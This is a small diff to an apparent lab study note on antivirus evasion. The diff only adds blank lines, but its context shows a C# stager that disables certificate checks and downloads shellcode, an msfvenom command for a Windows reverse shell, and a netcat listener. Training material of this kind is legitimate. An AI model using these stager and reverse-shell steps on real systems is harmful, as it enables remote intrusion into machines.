@@ -262,6 +262,7 @@ private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMillis
 - The first part of the `Stager()` function will create a new `WebClient()` object that allows us to download the shellcode using web requests.
 - Before making the actual requests, we will **overwrite** the `ServerCertificateValidationCallback` method in charge of validating SSL certificates when using HTTPS requests so that the `WebClient` doesn't complain about **self-signed or invalid certificates**, which we will be using in the **web server hosting the payloads**.
 - After that, we will call the `DownloadData()` method to download the shellcode from the given URL and store it into the `shellcode` variable:
+
 ```csharp
 WebClient wc = new WebClient();
 ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
@@ -314,6 +315,7 @@ PS C:\> csc staged-payload.cs
 - Once our payload is compiled, we will need to **set up a web server to host** the final shellcode.
 - Remember that our stager will connect to this server to retrieve the shellcode and execute it in the victim machine in-memory.
 - Let's start by generating a shellcode with `msfvenom`:
+
 ```shell-session
 user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.83.132 LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
 ```
@@ -715,6 +717,7 @@ user@AttackBox$ nc -lvp 443
 ### Packing our Shellcode
 
 - Let's start from a basic `C#` shellcode. You can also find this code in Windows machine at `C:\Tools\CS Files\UnEncStagelessPayload.cs`:
+
 ```csharp
 using System;
 using System.Net;
